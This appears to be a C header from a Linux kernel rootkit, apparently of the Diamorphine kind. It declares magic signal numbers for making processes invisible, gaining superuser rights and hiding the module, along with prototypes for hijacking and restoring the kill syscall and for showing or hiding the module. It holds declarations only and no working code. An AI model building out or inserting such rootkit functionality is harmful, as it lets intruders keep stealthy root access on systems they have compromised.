enum {
    SIGINVIS = 31,
    SIGSUPER = 64,
    SIGMODINVIS = 63,
};

int new_kill(const struct pt_regs *pt_regs);
void hijack_kill(void);
void restore_kill(void);

void module_show(void);
void module_hide(void);
